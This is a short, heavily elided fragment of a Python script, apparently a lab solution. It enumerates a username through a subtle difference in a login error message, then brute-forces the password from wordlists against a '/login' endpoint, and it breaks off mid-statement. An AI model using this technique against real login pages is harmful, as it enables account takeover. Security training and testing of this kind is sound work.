...
def login(url, username, password):
  ...
  Return values:
    ...
    1 if response contains 'Invalid username or password.'
    2 if response contains 'Invalid username or password', indicating username is valid.
...
def main():
  ...
  url = f'{host}/login'
  username = enumerate_username(f'{url}', './username.txt')
  if not username:
    print(f'[-] Failed to enumerate username')
    sys.exit(-2)
  print(f'[+] Found username: {username}')

  password = enumerate_password(f'{url}', username, './password.txt')
  if not password:
